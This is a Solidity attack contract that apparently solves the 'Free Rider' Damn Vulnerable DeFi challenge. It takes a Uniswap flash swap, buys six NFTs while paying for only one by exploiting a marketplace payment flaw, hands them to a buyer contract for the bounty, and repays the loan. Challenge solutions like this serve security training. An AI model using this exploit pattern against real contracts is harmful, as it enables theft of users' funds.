pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "./DamnValuableNFT.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface WETH {
    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool);

    function transfer(address, uint256) external returns (bool);

    function withdraw(uint256) external;

    function balanceOf(address) external returns (uint256);

    function deposit() external payable;
}

interface UniswapV2Pair {
    function swap(
        uint256,
        uint256,
        address,
        bytes memory
    ) external;
}

contract Attack is IERC721Receiver {
    address payable private nftMarketPlace;
    address payable private riderBuyer;
    uint256[] private tokensIds = [0, 1, 2, 3, 4, 5];
    address payable private damnValuableNFT;
    WETH private weth;
    address payable uniswapPair;
    uint256 private received;
    DamnValuableNFT public token;

    constructor(
        address _nftMarketPlace,
        address _riderBuyer,
        address _damnValuableNFT,
        address _weth,
        address payable _uniswapPair
    ) {
        riderBuyer = payable(_riderBuyer);
        nftMarketPlace = payable(_nftMarketPlace);
        damnValuableNFT = payable(_damnValuableNFT);
        weth = WETH(_weth);
        uniswapPair = payable(_uniswapPair);
        token = new DamnValuableNFT();
    }

    //this function will be called by the NFT marketplace to transfer to NFT to this contract
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function transferToMarket() public {
        console.log(weth.balanceOf(uniswapPair));
        //get a flash loan fromm uniswapv2pair
        UniswapV2Pair(uniswapPair).swap(
            15 ether,
            0,
            address(this),
            abi.encode("callme()")
        );
    }

    //this function will be call as the contract doesnt have a "callme" function
    fallback() external payable {
        //get eth from weth in order to buy the nft
        weth.withdraw(15 ether);
        uint256 amount = 15 ether;
        //buy the nfts (only sending the price for 1 is ok as there is an exploit with the contract)
        FreeRiderNFTMarketplace(nftMarketPlace).buyMany{value: 15 ether}(
            tokensIds
        );
        //transfer the nfts to the buyer in order to have attacker receive the money
        for (uint256 i = 0; i < tokensIds.length; i++) {
            DamnValuableNFT(damnValuableNFT).safeTransferFrom(
                address(this),
                riderBuyer,
                i
            );
        }
        //calculate fee (approximately 3 per cent)
        uint256 fee = 1 + (amount * 3) / 997;
        weth.deposit{value: fee + amount}();
        //send back flash loan money + the fee
        weth.transfer(uniswapPair, fee + amount);
    }

    receive() external payable {}
}
